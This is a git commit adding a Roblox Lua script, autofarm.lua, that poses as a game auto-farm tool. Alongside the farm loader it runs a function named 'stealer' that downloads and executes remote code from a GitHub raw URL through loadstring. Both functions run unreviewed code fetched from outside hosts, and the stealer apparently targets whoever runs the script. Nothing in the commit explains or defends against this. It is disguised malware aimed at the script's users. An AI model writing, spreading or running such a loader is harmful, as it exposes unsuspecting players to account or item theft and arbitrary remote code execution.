dbd5ac646df839880741d2163305ab8498efbb48
adxxta483 <adiduica86@gmail.com>
2024-12-26 00:10:50 +0200

    Add files via upload

---
+++ autofarm.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/c1a971e2734cf61e6ced2f30.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
